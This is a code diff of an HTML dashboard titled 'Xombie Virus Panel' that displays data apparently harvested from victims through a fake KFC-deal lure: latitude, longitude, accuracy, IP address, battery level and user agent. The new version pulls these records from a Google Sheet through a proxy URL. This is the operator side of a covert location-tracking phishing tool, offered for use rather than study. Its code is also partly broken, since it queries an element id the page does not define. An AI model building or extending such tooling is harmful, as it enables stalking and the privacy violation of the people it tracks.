@@ -1,55 +1,65 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Location Panel - XOMBIE</title>
+  <meta charset="UTF-8">
+  <title>Xombie Virus Panel</title>
   <style>
     body {
-      background: black;
-      color: lime;
-      font-family: monospace;
+      font-family: Arial, sans-serif;
+      background: #000;
+      color: #0ff;
       padding: 20px;
     }
     h1 {
-      color: cyan;
+      color: #fff;
       text-align: center;
     }
-    pre {
-      background: #111;
-      padding: 20px;
-      border: 1px solid lime;
+    .entry {
+      border: 2px solid #0ff;
+      padding: 15px;
+      margin: 10px 0;
       border-radius: 10px;
-      font-size: 16px;
+      background: #111;
     }
   </style>
 </head>
 <body>
-  <h1>📡 XOMBIE Location Tracker Panel</h1>
-  <pre id="output">Fetching location data...</pre>
+  <h1>📍 XombieVirus Panel (Live KFC Data)</h1>
+  <div id="data"></div>
 
-  <script>
-    async function fetchData() {
-      try {
-        const res = await fetch('latest.json');
-        const data = await res.json();
-        document.getElementById('output').innerText = `
-🍗 Nearby KFC Deal Request
-📍 Latitude: ${data.lat}
-📍 Longitude: ${data.lon}
-🎯 Accuracy: ${data.accuracy} meters
-🌐 IP Address: ${data.ip}
-🔋 Battery: ${data.battery}
-🧠 User Agent: ${data.ua}
-📍 Google Maps: https://www.google.com/maps?q=${data.lon}
-🔥 POWERED BY XOMBIE TOOLS ☣️💀⚠️
-        `;
-      } catch (e) {
-        document.getElementById('output').innerText = "No location data found.";
-      }
-    }
+<script>
+  async function loadData() {
+    const sheetURL = 'https://opensheet.elk.sh/169KNrSyMEwmVJAHsMVTIGmevUvHjFrgr2-424nMEwhc/Sheet1';
+    const res = await fetch(sheetURL);
+    const data = await res.json();
 
-    fetchData();
-    setInterval(fetchData, 5000); // Auto-refresh every 5 sec
-  </script>
+    // Optional: Console check
+    console.log(data);
+
+    // Yahan apni panel ki display logic likho, for example:
+    const container = document.getElementById("location-data");
+    data.forEach(entry => {
+      const card = document.createElement("div");
+      card.className = "entry-card";
+      card.innerHTML = `
+        <p><strong>Latitude:</strong> ${entry.Latitude}</p>
+        <p><strong>Longitude:</strong> ${entry.Longitude}</p>
+        <p><strong>Accuracy:</strong> ${entry.Accuracy}</p>
+        <p><strong>IP:</strong> ${entry.IP}</p>
+        <p><strong>Battery:</strong> ${entry.Battery}</p>
+        <p><strong>UserAgent:</strong> ${entry.UserAgent}</p>
+        <p><strong>Time:</strong> ${entry.Time}</p>
+        <hr/>
+      `;
+      container.appendChild(card);
+    });
+  }
+
+  // Load data on page load
+  window.onload = loadData;
+</script>
 </body>
 </html>
+(No Title)
+
+
